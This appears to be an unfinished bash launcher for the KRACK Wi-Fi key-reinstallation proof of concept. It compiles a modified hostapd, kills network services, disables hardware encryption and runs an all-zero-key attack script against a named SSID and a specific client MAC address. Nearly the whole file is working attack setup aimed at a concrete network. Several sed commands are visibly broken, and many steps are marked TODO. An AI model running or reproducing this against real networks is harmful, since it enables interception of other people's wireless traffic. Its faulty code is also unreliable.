#!/bin/bash

# Install dependencies
echo "Setting up dependencies..."

# Set interface variables:
eth0=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==1' | tr -d ':')

wlan0=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==3' | tr -d ':')

wlan1=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==4' | tr -d ':')

# Replace hard-coded interface value in dnsmasq.conf
sed -i "1s/.*/interface=$(sed '2q;d' $wlan1)/" ./krackattacks-poc-zerokey/krackattack/dnsmasq.conf

# Replace hard-coded interface values in enable_internet_forwarding.sh

#TODO should test whether we can use wlan1 0 to forward traffic, of it it's busy monitoring.
sed -i "5s/.*/INTERNET=$(sed '5q;d' $eth0)/" ./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh

sed -i "7s/.*/INTERNET=$(sed '7q;d' $wlan1)/" ./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh

# Make modified hostapd instance. Only needs to be done once
if [[ ! -x "./krackattacks-poc-zerokey/hostapd/hostapd" ]] 
then 
	echo "Compiling hostapd"
	cd ./krackattacks-poc-zerokey/hostapd/
	cp defconfig .config
	make -j 2 1>/dev/null
	cd ../../
fi

#Disable network
sudo airmon-ng check kill

# Disable hardware encryption, as bugs on some Wi-Fi network interface cards could interfere with the script used to check whether a client is vulnerable
## NOTE we should also make sure that this is reversed when the user is done... Perhaps make it an option
./findVulnerable/krackattack/disable-hwcrypto.sh

#Let user choose whether to reboot computer
## NOTE not implemented

#### NOTE: next sections not done

#RUN: systool -vm ath9k_htc

## Customise files:









## TODO To check: the nohwcript/.. param has been set.

# TODO Look for key reinstallations in the 4-way handshake
./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa

